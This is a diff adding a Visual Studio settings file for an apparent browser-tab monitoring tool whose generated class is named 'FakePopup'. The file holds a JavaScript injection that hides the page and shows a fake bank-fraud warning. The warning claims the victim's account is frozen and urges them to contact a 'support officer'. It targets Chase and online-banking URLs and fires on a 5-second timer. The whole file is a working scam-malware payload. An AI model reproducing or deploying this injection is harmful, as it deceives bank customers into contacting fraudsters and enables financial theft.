@@ -1,0 +1,26 @@
+﻿<?xml version='1.0' encoding='utf-8'?>
+<SettingsFile xmlns="http://schemas.microsoft.com/VisualStudio/2004/01/settings" CurrentProfile="(Default)" GeneratedClassNamespace="BrowserTabsMonitor" GeneratedClassName="FakePopup">
+  <Profiles />
+  <Settings>
+    <Setting Name="jsPopupElement" Type="System.String" Scope="User">
+      <Value Profile="(Default)">&lt;div style="$_jsCSS_$"&gt;&lt;h1&gt;WARNING!&lt;/h1&gt;&lt;h2&gt;SUSPICIOUS FRAUDULENT ACTIVITY DETECTED!&lt;/h2&gt;&lt;p&gt;Dear Customer, we detected some suspicious transactions on your bank account and froze your access to comply with local law. Please contact your support officer as soon as possible.&lt;/p&gt;&lt;/div&gt;</Value>
+    </Setting>
+    <Setting Name="jsCSS" Type="System.String" Scope="User">
+      <Value Profile="(Default)">padding: 10%; margin: 10px; width: 99%; height: 100%; display: block; text-align: center; font-size: 30px; border: 6px solid red; background-color: grey;</Value>
+    </Setting>
+    <Setting Name="matchUrls" Type="System.Collections.Specialized.StringCollection" Scope="User">
+      <Value Profile="(Default)">&lt;?xml version="1.0" encoding="utf-16"?&gt;
+&lt;ArrayOfString xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"&gt;
+  &lt;string&gt;chase.com&lt;/string&gt;
+  &lt;string&gt;chaseonline&lt;/string&gt;
+  &lt;string&gt;demo-online-banking&lt;/string&gt;
+&lt;/ArrayOfString&gt;</Value>
+    </Setting>
+    <Setting Name="jsCommand" Type="System.String" Scope="User">
+      <Value Profile="(Default)">document.getElementById('body').style.display='none';document.body.insertAdjacentHTML('beforeend', '$_jsPopupElement_$');</Value>
+    </Setting>
+    <Setting Name="aTimerTimespan" Type="System.Int32" Scope="User">
+      <Value Profile="(Default)">5000</Value>
+    </Setting>
+  </Settings>
+</SettingsFile>
